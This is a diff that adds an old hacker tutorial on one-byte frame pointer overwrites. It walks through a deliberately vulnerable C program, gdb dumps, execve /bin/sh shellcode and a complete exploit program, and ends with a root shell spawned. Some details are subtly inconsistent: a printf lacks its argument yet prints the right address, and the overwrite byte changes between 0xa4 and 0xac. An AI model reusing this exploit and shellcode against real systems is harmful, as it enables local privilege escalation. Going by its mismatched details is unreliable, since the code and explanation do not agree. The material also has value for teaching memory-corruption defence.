@@ -1,0 +1,464 @@
+
+	    ONE BYTE FRAME POINTER OVERWRITE HARDCODED EXPLOITS
+		             - A CASE STUDY -
+		        BY nebunu <nebunu@home.ro>
+
+
+Hello again!Recently i've seen many exploits using this method,i've looked
+on the net for some good tutorials to satisfy a friend curiosity but 
+i only find the one that was published in Phrack,too hard to understand
+for beginners.Thats why i'm gonna clear things up a bit.Understanding
+this,involves knowledge of classical buffer overflow and stack image.
+If you dont know these things,stop reading this and take a look at this 
+instead:
+http://www.enderunix.org/documents/eng/bof-eng.txt
+
+Ok,here is our case study:
+
+--------------- vuln.c --------------------
+#include <stdio.h>
+
+void f(char *sm)
+{
+char z[8];
+int i;
+for(i=0;i<=8;i++)
+z[i]=sm[i];
+}
+
+int main(int argc,char **argv)
+{
+f(argv[1]);
+}
+-------------------------------------------
+
+Lets see how the stack looks like in this case:
+
+[eip]
+[ebp]
+char z[8]
+int i;
+[esp]
+
+As you can easily see the f()'s saved frame pointer is overwritten
+by only one byte,here is the vulnerable loop:
+
+for(i=0;i<=8;i++)z[i]=sm[i];
+
+As a result(take a look at the stack's image) ebp is overwritten by
+ONLY one byte and the stack looks like this now:
+
+[eip]
+[altered ebp by one byte]
+char z[8]
+int i;
+[esp]
+
+Lets take a closer look and fire up the good old gdb:
+
+
+[root@nebunu hack]# gcc vuln.c -o vuln
+[root@nebunu hack]# gdb vuln
+GNU gdb Red Hat Linux (5.2.1-4)
+Copyright 2002 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(gdb) disas f
+Dump of assembler code for function f:
+0x80482f4 <f>:  push   %ebp
+0x80482f5 <f+1>:        mov    %esp,%ebp
+0x80482f7 <f+3>:        sub    $0x10,%esp
+0x80482fa <f+6>:        movl   $0x0,0xfffffff4(%ebp)
+0x8048301 <f+13>:       cmpl   $0x8,0xfffffff4(%ebp)
+0x8048305 <f+17>:       jle    0x8048309 <f+21>
+0x8048307 <f+19>:       jmp    0x8048322 <f+46>
+0x8048309 <f+21>:       lea    0xfffffff8(%ebp),%eax
+0x804830c <f+24>:       mov    %eax,%edx
+0x804830e <f+26>:       add    0xfffffff4(%ebp),%edx
+0x8048311 <f+29>:       mov    0xfffffff4(%ebp),%eax
+0x8048314 <f+32>:       add    0x8(%ebp),%eax
+0x8048317 <f+35>:       mov    (%eax),%al
+0x8048319 <f+37>:       mov    %al,(%edx)
+0x804831b <f+39>:       lea    0xfffffff4(%ebp),%eax
+0x804831e <f+42>:       incl   (%eax)
+0x8048320 <f+44>:       jmp    0x8048301 <f+13>
+0x8048322 <f+46>:       leave
+0x8048323 <f+47>:       ret
+End of assembler dump.
+(gdb) disas main
+Dump of assembler code for function main:
+0x8048324 <main>:       push   %ebp
+0x8048325 <main+1>:     mov    %esp,%ebp
+0x8048327 <main+3>:     sub    $0x8,%esp
+0x804832a <main+6>:     and    $0xfffffff0,%esp
+0x804832d <main+9>:     mov    $0x0,%eax
+0x8048332 <main+14>:    sub    %eax,%esp
+0x8048334 <main+16>:    sub    $0xc,%esp
+0x8048337 <main+19>:    mov    0xc(%ebp),%eax
+0x804833a <main+22>:    add    $0x4,%eax
+0x804833d <main+25>:    pushl  (%eax)
+0x804833f <main+27>:    call   0x80482f4 <f>
+0x8048344 <main+32>:    add    $0x10,%esp
+0x8048347 <main+35>:    leave
+0x8048348 <main+36>:    ret
+0x8048349 <main+37>:    nop
+0x804834a <main+38>:    nop
+0x804834b <main+39>:    nop
+End of assembler dump.
+(gdb) quit
+
+>From the disassemble code of f() you see the following:
+sub    $0x10,%esp
+It means that the function's stack is 0x10=16 bytes.
+4 bytes are allocated to int i,8 are allocated to char z[8] and
+4 are allocated to frame pointer held in register ebp.
+In order to understand better,we will set a breakpoint to ret
+instruction of function f() and to ret instruction of main()
+at 0x8048323 and 0x8048348. 
+
+[root@nebunu hack]# gdb vuln
+GNU gdb Red Hat Linux (5.2.1-4)
+Copyright 2002 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(gdb) break *0x8048323
+Breakpoint 1 at 0x8048348
+(gdb) break *0x8048348
+Breakpoint 2 at 0x8048348
+(gdb) r AAAAAAAAA
+Starting program: /root/hack/vuln AAAAAAAAA
+
+Breakpoint 1, 0x08048323 in f ()
+(gdb) i r ebp
+ebp            0xbffffa41       0xbffffa41
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x08048348 in main ()
+(gdb) i r esp
+esp            0xbffffa45       0xbffffa45
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x0040012b in ?? ()
+(gdb) q
+The program is running.  Exit anyway? (y or n) y
+[root@nebunu hack]#
+
+By running the program with 9 chars instead of 8,we overwrite ebp
+last byte with 0x41 (0x41 is A in hex).
+When we return from f() our ebp is 0xbffffa41,and when we return from
+main() esp (stack pointer) is 0xbffffa41+4=0xbffffa45,because
+ebp was restored in esp (leave instruction) and poped from the stack
+(4 bytes were added to it).
+
+Here is the stack image:
+
+[eip]
+[altered ebp by one byte]
+char z[8]
+int i;
+[esp]
+
+By altering esp,the whole stack is translated,therefore a random eip
+is poped from the stack,so a random instruction will be executed :)
+Lets investigatate further:
+
+..............
+(gdb) disas f
+Dump of assembler code for function f:
+0x80482f4 <f>:  push   %ebp
+0x80482f5 <f+1>:        mov    %esp,%ebp
+0x80482f7 <f+3>:        sub    $0x10,%esp
+0x80482fa <f+6>:        movl   $0x0,0xfffffff4(%ebp)
+0x8048301 <f+13>:       cmpl   $0x8,0xfffffff4(%ebp)
+0x8048305 <f+17>:       jle    0x8048309 <f+21>
+0x8048307 <f+19>:       jmp    0x8048322 <f+46>
+0x8048309 <f+21>:       lea    0xfffffff8(%ebp),%eax
+0x804830c <f+24>:       mov    %eax,%edx
+0x804830e <f+26>:       add    0xfffffff4(%ebp),%edx
+0x8048311 <f+29>:       mov    0xfffffff4(%ebp),%eax
+0x8048314 <f+32>:       add    0x8(%ebp),%eax
+0x8048317 <f+35>:       mov    (%eax),%al
+0x8048319 <f+37>:       mov    %al,(%edx)
+0x804831b <f+39>:       lea    0xfffffff4(%ebp),%eax
+0x804831e <f+42>:       incl   (%eax)
+0x8048320 <f+44>:       jmp    0x8048301 <f+13>
+0x8048322 <f+46>:       leave
+0x8048323 <f+47>:       ret
+End of assembler dump.
+(gdb) break *0x80482fa
+Breakpoint 2 at 0x80482fa
+(gdb) r AAAAAAAAA
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /root/hack/vuln AAAAAAAAA
+
+Breakpoint 2, 0x080482fa in f ()
+(gdb) i r esp
+esp            0xbffffaa8       0xbffffaa8
+
+Now we got esp just before f()'s frame is being activated.
+Here is the exploit image:
+
+[altered ebp]
+[shellcode address]
+[shellcode]
+[nops]
+
+
+It's easy! ebp will be poped from the stack,instruction [shellcode address]
+will be executed (our fake eip) and it will point to a shellcode.
+Well,we dont have space for a shellcode,remember that our buffer z[8]
+is only 8 bytes long? So,if we cant put a shellcode into a buffer what
+shall we do now? We can use alot of tricks here.Here is a simple one:
+In our buffer (8 bytes) put a <jmp address> instruction,it will point
+to our shellcode located in an environment pointer,or higher in memory.
+Here is the image:
+
+[altered ebp]
+[address to jmp shellcode]
+[jmp shellcode]
+
+
+Now,lets get the locations,shall we?
+Since esp is 0xbffffaa8,our buffer in which we'll put the instruction
+<jmp address to shellcode> will be placed at 0xbffffaa8+0x04=0xbffffaac
+where 0x04 is sizeof int i and the pointer to it will be located at
+0xbffffaac+0x08-0x04=0xbffffab0.
+The last byte to alter ebp will be b0-4=ac since when main() returns
+ebp will be poped from the stack so we have to compensate 4 bytes.
+Here is the final stack image:
+
+[saved eip]
+[altered ebp]
+[address to jmp shellcode] --> this is esp
+[jmp shellcode]
+
+Or,to be more specific
+
+[saved eip]
+[0xa4] --> this is the byte that will overflow ebp
+[0xbffffaac] --> this is the address of <jmp shellcode> instruction
+[jmp shellcode]
+
+Now,enough talking,lets put together the exploit.
+I'm planning to put the shellcode into an environment,so i know
+it's exact address,if you dont know what i'm talking about follow the
+link i gave you at the beginning of this paper.
+Knowing it's exact address,we write a program that contains <jmp address>
+instruction,dissasemble it,take the opcodes that fits into 8 bytes
+and apply the above scheme.
+
+
+----------------------- dummy.c -----------------------------
+#include <stdio.h>
+#include <string.h>
+#include <unistd.h>
+
+char sc[]="\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
+
+void main()
+{
+int ret = 0xbffffffa - strlen(sc) - strlen("/root/hack/vuln");
+/* this gives us the exact address of the shellcode
+   located in vuln's environment
+*/
+printf("\n\n%x\n\n");
+}
+-------------------------------------------------------------
+
+We compile it and run it in order to find the exact address of the
+shellcode.Dont forget to change /root/hack/vuln with your path in
+which the vulnerable program lays.
+
+[root@nebunu hack]# gcc dummy.c -o dummy
+dummy.c: In function `main':
+dummy.c:5: warning: return type of `main' is not `int'
+[root@nebunu hack]# ./dummy
+
+
+bfffffd3
+
+[root@nebunu hack]#
+
+Now we must obtain the opcodes for <jmp bfffffd3> instruction.
+Lets go for it:
+
+------------------------- dummy2.c -----------------------
+
+#include <stdio.h>
+
+main()
+{
+__asm("jmp 0xbfffffd3");
+} 
+-----------------------------------------------------------
+
+[root@nebunu hack]# gcc dummy2.c -o dummy
+[root@nebunu hack]# objdump -S dummy | grep jmp
+ 804822a:       ff 25 48 94 04 08       jmp    *0x8049448
+ 8048234:       ff 25 4c 94 04 08       jmp    *0x804944c
+ 804823f:       e9 e0 ff ff ff          jmp    8048224 <_init+0x18>
+ 8048304:       e9 ca 7c fb b7          jmp    bfffffd3 <_end+0xb7fb6b7b>
+ 
+We are interestead in this:
+8048304:       e9 ca 7c fb b7          jmp    bfffffd3 <_end+0xb7fb6b7b>
+
+Our jump shellcode is,as you see "\xe9\xca\x7c\xfb\xb7"
+Oh noooo! It is 5 bytes long!! 5 bytes jmp shellcode + 4 bytes the
+address of <jmp shellcode> that makes 9 bytes,and our buffer is only
+8 bytes long!! We were owned! :(
+Are we? We must change the <jmp shellcode> with something that fits
+in only 4 bytes..lets write a dummy exploit to get the idea.Dont worry,
+i'll write the real one after so keep reading :)
+
+----------------------- expl.c ----------------------
+
+#include <stdio.h>
+
+char shellcode[]="\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
+char dummy_shellcode[]="\x41\x41\x41\x41"; /* our dummy address */
+char *env[2]={shellcode,NULL};
+char buffer[9];
+
+main()
+{
+/* here we set our instruction */
+strcat(buffer,dummy_shellcode);
+/* here we set it's address,which is (see before),0xbffffaac */ 
+buffer[4]=0xac;
+buffer[5]=0xfa;
+buffer[6]=0xff;
+buffer[7]=0xbf;
+/* here we set the overflowing byte */
+buffer[8]=0xac;
+/* we run the code */
+execle("/root/hack/vuln","vuln",buffer,NULL,env);
+}
+--------------------------------------------------------
+
+[root@nebunu hack]# gcc expl.c -o expl;
+[root@nebunu hack]# gdb --exec=expl --symbol=vuln
+.....
+(gdb) r
+
+Starting program: /root/hack/expl
+
+Program received signal SIGTRAP, Trace/breakpoint trap.
+0x40000b30 in _start () from /lib/ld-linux.so.2
+(gdb) disas main
+Dump of assembler code for function main:
+0x8048324 <main>:       push   %ebp
+0x8048325 <main+1>:     mov    %esp,%ebp
+0x8048327 <main+3>:     sub    $0x8,%esp
+0x804832a <main+6>:     and    $0xfffffff0,%esp
+0x804832d <main+9>:     mov    $0x0,%eax
+0x8048332 <main+14>:    sub    %eax,%esp
+0x8048334 <main+16>:    sub    $0xc,%esp
+0x8048337 <main+19>:    mov    0xc(%ebp),%eax
+0x804833a <main+22>:    add    $0x4,%eax
+0x804833d <main+25>:    pushl  (%eax)
+0x804833f <main+27>:    call   0x80482f4 <f>
+0x8048344 <main+32>:    add    $0x10,%esp
+0x8048347 <main+35>:    leave
+0x8048348 <main+36>:    ret
+0x8048349 <main+37>:    nop
+0x804834a <main+38>:    nop
+0x804834b <main+39>:    nop
+End of assembler dump.
+(gdb) break *0x8048348
+Breakpoint 1 at 0x8048348
+(gdb) c
+Continuing.
+
+Breakpoint 1, 0x08048348 in main ()
+(gdb) i r esp
+esp            0xbffffeb0       0xbffffeb0
+(gdb) x 0xbffffeb0
+0xbffffeb0:     0x41414141
+(gdb) c
+Continuing.
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb)
+
+See? eip is overwritten with our dummy address,so we can put
+the shellcode into an environment pointer,since we know it's
+exact address,which is(read before),bfffffd3.
+
+Here is the real exploit:
+
+------------------ expl.c -------------------------
+#include <stdio.h>
+
+char shellcode[]="\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
+char dummy_shellcode[]="\xd3\xff\xff\xbf"; /* shellcode's address */
+char *env[2]={shellcode,NULL};
+char buffer[9];
+
+main()
+{
+/* here we set our instruction */
+strcat(buffer,dummy_shellcode);
+/* here we set it's address,which is (see before),0xbffffaac */ 
+buffer[4]=0xac;
+buffer[5]=0xfa;
+buffer[6]=0xff;
+buffer[7]=0xbf;
+/* here we set the overflowing byte */
+buffer[8]=0xac;
+/* we run the code */
+execle("/root/hack/vuln","vuln",buffer,NULL,env);
+}
+--------------------------------------------------------
+
+[root@nebunu hack]# gcc expl.c -o expl;./expl
+sh-2.05b# exit
+[root@nebunu hack]# 
+
+
+Of course,this is a tough nut to crack,real life exploits are
+far more easier to write then this,because they all have the
+buffer greater than 8 bytes and you can padd the way trough
+shellcode with nops,so we must not be so exact in the shellcode
+calculation.One can set the esp to point in the middle of the
+nops before executing the shellcode.
+But there is a problem though.
+If the buffer is not the first variable near ebp,the other
+variables may be overwritten and the program will gave a 
+wrong output.In order to prevent this,you must construct the
+buffer in such a way to keep the initial values for the variables.
+But this,in a future tutorial.
+Okay,that was it.The samba exploit was based on this tehnique,
+the sendmail exploit uses the same method.
+I know it's not easy to understand for beginners,but we all were
+beginners once,we all wanted to hack in our girlfriend's computer
+before switching to serious hacking.Dont be mad if you dont
+understand it from the very first time,read it again and again,
+read other tutorials regarding the matter(including Phrack),
+and someday,after several years this will seem very easy.
+Please dont mail me any questions since i'm caught with exams and
+i dont have time to answer.
+You have permission to publish it on your site as long as you
+dont change anything and credit has been given.
+If you find any mistakes in it,then please mail me,i'll find
+5 minutes to answer you.
+
+
+Greetings to rebel( heya mate ),neworder team and all the friends i know.
+Dont cry if you're not on the list,i forgot to add you,but that doesnt
+mean i've forgotten you :)
+Sorry,my english sucks,but i'm not native.
+
+Have a nice exploitation,
+nebunu
